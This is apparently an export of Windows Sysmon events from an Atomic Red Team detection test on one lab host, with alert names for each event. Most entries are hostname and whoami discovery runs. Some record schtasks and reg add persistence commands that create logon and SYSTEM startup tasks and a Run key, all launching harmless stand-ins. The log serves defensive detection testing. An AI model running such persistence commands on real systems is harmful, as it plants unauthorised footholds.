UtcTime: 2026-08-16 16:13:38.838
"
2026-08-16T16:14:02.999357+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6636,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6576
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E1CA-6A81-250D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:14:02.995
"
2026-08-16T16:14:03.024569+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6637,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 5328
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E1CB-6A81-260D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:14:03.022
"
2026-08-16T16:21:53.128678+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6647,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 10380
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E3A1-6A81-2D0D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:21:53.120
"
2026-08-16T16:21:53.164258+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6648,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 8980
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E3A1-6A81-2E0D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:21:53.160
"
2026-08-16T16:21:54.824220+00:00,Scheduled Task Creation Via Schtasks.EXE;Suspicious Schtasks Schedule Types,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6650,DESKTOP-JC89B03,"Image: C:\Windows\System32\schtasks.exe
RuleName: '-'
Description: Task Scheduler Configuration Tool
OriginalFileName: schtasks.exe
TerminalSessionId: 1
ParentCommandLine: '""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 10416
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
ParentProcessGuid: 50A489D6-E3A1-6A81-2F0D-000000000200
ProcessId: 10872
CurrentDirectory: C:\Users\soc\AppData\Local\Temp\
ProcessGuid: 50A489D6-E3A2-6A81-310D-000000000200
CommandLine: 'schtasks  /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" '
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2026-08-16 16:21:54.800
"
2026-08-16T16:21:54.932169+00:00,Scheduled Task Creation Via Schtasks.EXE;Schtasks Creation Or Modification With SYSTEM Privileges;Suspicious Command Patterns In Scheduled Task Creation;Suspicious Schtasks Schedule Type With High Privileges,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6652,DESKTOP-JC89B03,"Image: C:\Windows\System32\schtasks.exe
RuleName: '-'
Description: Task Scheduler Configuration Tool
OriginalFileName: schtasks.exe
TerminalSessionId: 1
ParentCommandLine: '""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 10416
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
ParentProcessGuid: 50A489D6-E3A1-6A81-2F0D-000000000200
ProcessId: 6120
CurrentDirectory: C:\Users\soc\AppData\Local\Temp\
ProcessGuid: 50A489D6-E3A2-6A81-320D-000000000200
CommandLine: schtasks  /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2026-08-16 16:21:54.909
"
2026-08-16T16:25:53.507739+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6658,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 4644
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E491-6A81-3B0D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:25:53.503
"
2026-08-16T16:25:53.530347+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6659,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6244
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E491-6A81-3C0D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:25:53.527
"
2026-08-16T16:26:14.450617+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6663,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 9524
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E4A6-6A81-410D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:26:14.446
"
2026-08-16T16:26:14.477126+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6664,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 2456
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E4A6-6A81-420D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:26:14.472
"
2026-08-16T18:04:48.348566+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6707,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 8040
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-FBC0-6A81-800D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 18:04:48.342
"
2026-08-16T18:04:48.375025+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6708,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 3064
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-FBC0-6A81-810D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 18:04:48.371
"
2026-08-16T18:06:58.991704+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6710,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 316
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-FC42-6A81-830D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 18:06:58.986
"
2026-08-16T18:06:59.016515+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6711,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 11040
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-FC43-6A81-840D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 18:06:59.013
"
2026-08-16T18:07:57.919598+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6714,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 7752
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-FC7D-6A81-880D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 18:07:57.916
"
2026-08-16T18:07:57.948129+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6715,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 5324
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-FC7D-6A81-890D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 18:07:57.941
"
2026-08-16T18:07:58.507377+00:00,Direct Autorun Keys Modification;Potential Persistence Attempt Via Run Keys Using Reg.EXE,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6717,DESKTOP-JC89B03,"Image: C:\Windows\System32\reg.exe
RuleName: '-'
Description: Registry Console Tool
OriginalFileName: reg.exe
TerminalSessionId: 1
ParentCommandLine: '""cmd.exe"" /c REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6292
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 50A489D6-FC7E-6A81-8A0D-000000000200
ProcessId: 7664
CurrentDirectory: C:\Users\soc\AppData\Local\Temp\
ProcessGuid: 50A489D6-FC7E-6A81-8C0D-000000000200
CommandLine: REG  ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2026-08-16 18:07:58.492
"
2026-08-16T19:13:07.318557+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6746,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 8416
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-0BC3-6A82-B30D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 19:13:07.314
"
2026-08-16T19:13:07.345434+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6747,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6520
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-0BC3-6A82-B40D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 19:13:07.343
"
2026-08-19T15:00:11.634134+00:00,Suspicious Execution of Systeminfo,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,7784,DESKTOP-JC89B03,"Image: C:\Windows\System32\systeminfo.exe
RuleName: '-'
Description: Displays system information
OriginalFileName: sysinfo.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=EE309A9C61511E907D87B10EF226FDCD,SHA256=6F87CAA51BDEA802045BB281FC2686A3C76364C26A3FFE6C2CCAC4AF5F9DB37B,IMPHASH=C7C3DF13F22D7A13802E6509367A5830
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 7056
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-C4FB-6A85-FA0F-000000000200
CommandLine: '""C:\Windows\system32\systeminfo.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-19 15:00:11.605
"
